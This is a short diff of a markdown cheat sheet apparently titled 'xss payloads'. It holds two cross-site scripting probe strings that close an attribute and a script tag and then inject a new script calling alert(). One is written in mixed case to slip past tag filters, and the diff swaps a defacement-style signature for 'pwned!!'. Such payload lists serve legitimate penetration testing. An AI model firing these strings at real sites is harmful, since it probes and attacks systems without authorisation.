@@ -1,3 +1,5 @@
-# xss payloads
+# xss
+```command
 '"></script><script>alert('pwned!!')</script>
-'"></sCriPt><sCriPt>alert('H4ck3d_by_Rug3l3on')</sCriPt>
+'"></sCriPt><sCriPt>alert('pwned!!')</sCriPt>
+```
